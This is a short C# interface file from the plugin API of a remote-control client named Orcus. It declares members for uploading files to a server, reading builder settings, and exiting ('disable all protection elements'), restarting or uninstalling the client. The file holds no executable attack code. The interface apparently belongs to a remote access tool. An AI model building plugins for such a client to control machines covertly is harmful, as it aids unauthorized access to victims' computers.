using Orcus.Shared.Core;

namespace Orcus.Plugins
{
    /// <summary>
    ///     Provide methods to control the client
    /// </summary>
    public interface IClientOperator : IClientStartup
    {
        /// <summary>
        ///     Some tools provided by the client
        /// </summary>
        IToolBase ToolBase { get; }

        /// <summary>
        ///     Upload files to the server
        /// </summary>
        IDatabaseConnection DatabaseConnection { get; }

        /// <summary>
        ///     The framework version of the client
        /// </summary>
        FrameworkVersion FrameworkVersion { get; }

        /// <summary>
        ///     Important paths for Orcus
        /// </summary>
        IPathInformation PathInformation { get; }

        /// <summary>
        ///     Determines whether the current process is a 64-bit process
        /// </summary>
        bool Is64BitProcess { get; }

        /// <summary>
        ///     Get a specific setting of the current client
        /// </summary>
        /// <typeparam name="T">The type of the setting found in <see cref="Orcus.Shared.Settings" /></typeparam>
        /// <returns>Return the setting object</returns>
        T GetBuilderProperty<T>() where T : IBuilderProperty, new();

        /// <summary>
        ///     Disable all protection elements and terminate
        /// </summary>
        void Exit();

        /// <summary>
        ///     Restart the application
        /// </summary>
        void Restart();

        /// <summary>
        ///     Uninstall the application and close afterwards
        /// </summary>
        void Uninstall();
    }
}